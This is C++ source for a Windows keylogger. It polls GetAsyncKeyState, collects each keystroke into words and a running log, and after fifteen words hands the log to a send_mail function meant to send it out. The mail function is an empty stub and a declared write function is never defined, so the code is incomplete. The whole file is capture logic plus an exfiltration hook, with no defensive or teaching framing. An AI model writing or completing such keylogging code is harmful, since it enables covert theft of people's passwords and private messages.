#include <bits/stdc++.h>
#include <windows.h>
#include <fstream>

#define KEY_PRESSED -32767

using namespace std;

void write(string txt);

void send_mail(string body);

bool main_loop(string &log, string &word, int &count);

int main()
{
    string log = "";
    string word = "";
    int count = 0;
    while (true)
    {
        bool running = main_loop(log, word, count);
        if (!running)
            break;
    }
    cout << log << endl;

    return 0;
}

bool main_loop(string &log, string &word, int &count)
{
    int i;

    for (i = 8; i < 169; i++)
    {
        if (GetAsyncKeyState(i) == KEY_PRESSED)
        {
            if (i == 27)
                return false;
            char ch = i;
            cout << ch << endl;
            if (i == 32 || i == 13 || i == 10)
            {
                log += word + '\n';
                word = "";
                count++;
                if (count == 15)
                    send_mail(log);
            }
            else if (i == 8)
                word = word.substr(0, word.length() - 1);
            else
                word += ch;
            cout << word << endl;
        }
    }

    return true;
}

void send_mail(string body)
{
}